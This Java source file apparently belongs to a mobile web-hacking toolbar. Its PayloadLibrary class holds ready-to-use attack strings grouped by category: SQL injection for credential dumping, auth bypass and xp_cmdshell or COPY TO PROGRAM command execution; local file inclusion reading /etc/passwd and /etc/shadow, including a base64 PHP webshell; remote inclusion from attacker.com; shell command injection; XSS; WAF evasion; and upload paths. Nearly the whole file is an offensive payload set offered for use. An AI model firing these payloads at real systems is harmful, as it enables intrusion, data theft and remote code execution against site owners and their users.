package com.darknethaxor.hackbar;

/**
 * PayloadLibrary — All SQL injection and attack payloads
 *
 * FIXES:
 * 1. All payloads were originally obfuscated as Base64 strings via com.a.a.a.a.a.a()
 *    Now stored as proper static final String arrays — readable, maintainable
 * 2. Payload categories expanded and organized
 */
public class PayloadLibrary {

    public static String[] getPayloads(String category) {
        switch (category) {
            case "sqli":         return SQLI_BASIC;
            case "union":        return SQLI_UNION;
            case "error":        return SQLI_ERROR;
            case "xpath":        return SQLI_XPATH;
            case "mssql":        return SQLI_MSSQL;
            case "postgresql":   return SQLI_POSTGRESQL;
            case "dios":         return SQLI_DIOS;
            case "lfi":          return LFI;
            case "rfi":          return RFI;
            case "rce":          return RCE;
            case "xss":          return XSS;
            case "auth_bypass":  return AUTH_BYPASS;
            case "union_select_bypass": return UNION_SELECT_BYPASS;
            case "waf_bypass":   return WAF_BYPASS;
            case "uploader":     return UPLOADER;
            default:             return new String[0];
        }
    }

    // ── SQL Injection Basic ──
    private static final String[] SQLI_BASIC = {
        "'",
        "''",
        "' OR '1'='1",
        "' OR '1'='1'--",
        "' OR '1'='1'/*",
        "' OR 1=1--",
        "' OR 1=1#",
        "') OR ('1'='1",
        "1' ORDER BY 1--",
        "1' ORDER BY 2--",
        "1' ORDER BY 3--",
        "1 ORDER BY 1--",
        "1 ORDER BY 2--",
        "1 ORDER BY 3--",
        "' GROUP BY columnnames having 1=1--",
        "1; DROP TABLE users--",
        "' HAVING 1=1--",
    };

    // ── Union Select ──
    private static final String[] SQLI_UNION = {
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION ALL SELECT NULL--",
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT 1,2,3,4--",
        "' UNION SELECT 1,2,3,4,5--",
        "' UNION SELECT @@version,NULL--",
        "' UNION SELECT user(),NULL--",
        "' UNION SELECT database(),NULL--",
        "' UNION SELECT table_name FROM information_schema.tables--",
        "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--",
        "' UNION SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()--",
        "' UNION SELECT group_concat(username,0x3a,password) FROM users--",
    };

    // ── Error Based ──
    private static final String[] SQLI_ERROR = {
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
        "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)--",
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)))--",
        "1 AND (SELECT * FROM (SELECT(SLEEP(1)))VNDK)",
        "' OR SLEEP(5)--",
        "1' AND SLEEP(5)--",
        "' WAITFOR DELAY '0:0:5'--",
        "' BENCHMARK(5000000,MD5(1))--",
    };

    // ── XPath ──
    private static final String[] SQLI_XPATH = {
        "' AND extractvalue(rand(),concat(0x3a,version()))--",
        "' AND extractvalue(rand(),concat(0x3a,database()))--",
        "' AND extractvalue(rand(),concat(0x3a,user()))--",
        "' AND extractvalue(rand(),concat(0x3a,(SELECT concat(table_name) FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)))--",
    };

    // ── MSSQL ──
    private static final String[] SQLI_MSSQL = {
        "'; EXEC xp_cmdshell('whoami')--",
        "'; EXEC master.dbo.xp_cmdshell('dir')--",
        "' UNION SELECT name FROM sysobjects WHERE xtype='U'--",
        "' UNION SELECT TOP 1 table_name FROM information_schema.tables--",
        "' UNION SELECT @@version,NULL,NULL--",
        "'; WAITFOR DELAY '0:0:5'--",
        "1; SELECT * FROM OPENROWSET('SQLOLEDB','';'sa';'',SELECT 1)--",
    };

    // ── PostgreSQL ──
    private static final String[] SQLI_POSTGRESQL = {
        "'; SELECT pg_sleep(5)--",
        "' UNION SELECT version()--",
        "' UNION SELECT current_database()--",
        "' UNION SELECT current_user--",
        "' UNION SELECT table_name FROM information_schema.tables--",
        "'; COPY (SELECT '') TO PROGRAM 'id'--",
    };

    // ── DIOS (Dump In One Shot) ──
    private static final String[] SQLI_DIOS = {
        "' UNION SELECT group_concat(0x7c,table_name,0x7c) FROM information_schema.tables WHERE table_schema=database()--",
        "' UNION SELECT (SELECT(@x)FROM(SELECT(@x:=0x00),(SELECT(@x)FROM(information_schema.columns)WHERE(table_schema=database())AND(@x)IN(@x:=concat(@x,0x0a,table_name,0x7c,column_name))))x)--",
        "' UNION SELECT concat(0x7c,0x7c,0x7c,(SELECT group_concat(table_name,0x7c,column_name SEPARATOR 0x7c7c) FROM information_schema.columns WHERE table_schema=database()))--",
    };

    // ── LFI (Local File Inclusion) ──
    private static final String[] LFI = {
        "../../etc/passwd",
        "../../etc/shadow",
        "../../etc/hosts",
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "../../../../../../etc/passwd",
        "../../../../../../etc/passwd%00",
        "../../proc/self/environ",
        "../../windows/win.ini",
        "../../winnt/win.ini",
        "../../boot.ini",
        "/etc/passwd",
        "/etc/shadow",
        "/proc/self/environ",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://input",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
        "expect://id",
        "zip://uploads/shell.jpg%23shell.php",
    };

    // ── RFI (Remote File Inclusion) ──
    private static final String[] RFI = {
        "http://attacker.com/shell.txt",
        "http://attacker.com/shell.txt?",
        "http://attacker.com/shell.txt%00",
        "https://attacker.com/phpinfo.txt",
        "ftp://attacker.com/shell.txt",
    };

    // ── RCE (Remote Code Execution) ──
    private static final String[] RCE = {
        ";id",
        ";id;",
        "|id",
        "|id|",
        "||id",
        "`id`",
        "$(id)",
        ";cat /etc/passwd",
        ";ls -la",
        ";whoami",
        ";uname -a",
        ";pwd",
        "&& whoami",
        "& whoami",
        "%0Acat%20/etc/passwd",
        "%0Aid",
    };

    // ── XSS ──
    private static final String[] XSS = {
        "<script>alert(1)</script>",
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "\"><script>alert(1)</script>",
        "'><script>alert(1)</script>",
        "<iframe src=javascript:alert(1)>",
        "<a href=javascript:alert(1)>click</a>",
        "javascript:alert(1)",
        "<script>document.write('<img src=x onerror=alert(1)>')</script>",
        "<marquee onstart=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
        "&#60;script&#62;alert(1)&#60;/script&#62;",
    };

    // ── Auth Bypass ──
    private static final String[] AUTH_BYPASS = {
        "' OR '1'='1",
        "' OR '1'='1'--",
        "' OR '1'='1'/*",
        "admin'--",
        "admin' #",
        "admin'/*",
        "' OR 1=1--",
        "' OR 1=1#",
        "') OR ('1'='1",
        "admin' OR '1'='1",
        "' OR 'x'='x",
        "1' OR '1' = '1",
        "\" OR \"\"=\"",
        "' OR ''='",
        "1' OR 1=1--",
    };

    // ── Union Select Bypass ──
    private static final String[] UNION_SELECT_BYPASS = {
        "UNiOn SeLeCt",
        "un/**/ion sel/**/ect",
        "UNION%20SELECT",
        "UNION%0ASELECT",
        "UNION%0DSELECT",
        "UNION%09SELECT",
        "UNION/**/SELECT",
        "UNI/**/ON SEL/**/ECT",
        "%55nion %53elect",
        "uNiOn SeLeCt",
    };

    // ── WAF Bypass ──
    private static final String[] WAF_BYPASS = {
        "/*!UNION*/ /*!SELECT*/",
        "/*! UNION SELECT*/",
        "UNION%23foo*%0D%0ASELECT",
        "--+",
        "-- -",
        "#",
        "/*!50000 UNION SELECT*/",
        "0x55 0x4e 0x49 0x4f 0x4e",
        "%61%64%6d%69%6e",
        "\u0055\u004e\u0049\u004f\u004e",
    };

    // ── Uploader Paths ──
    private static final String[] UPLOADER = {
        "/uploads/",
        "/upload/",
        "/images/",
        "/files/",
        "/media/",
        "/admin/upload/",
        "/wp-content/uploads/",
        "/data/upload/",
        "/userfiles/",
        "/user/files/",
        "/assets/uploads/",
        "/static/uploads/",
    };
}
